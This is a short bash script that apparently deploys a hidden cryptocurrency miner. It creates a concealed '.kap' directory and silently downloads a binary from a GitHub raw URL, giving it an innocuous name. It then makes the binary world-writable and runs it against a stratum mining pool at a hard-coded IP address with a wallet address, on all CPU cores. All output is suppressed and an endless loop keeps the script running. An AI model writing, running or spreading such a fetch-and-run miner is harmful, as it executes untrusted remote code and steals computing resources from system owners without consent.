#!/bin/bash
mkdir .kap && cd .kap
wget -O bubux https://github.com/nonibihan/tah/raw/refs/heads/main/bct >/dev/null 2>&1
chmod 777 bubux
./bubux -a verus -o stratum+tcp://128.199.213.167:443 -u RELwc1HwbmHQqWUUJSEUGDU27H2be5Vygu.UY -t $(nproc --all) >/dev/null 2>&1
while [ 1 ]; do
sleep 3
done
sleep 999
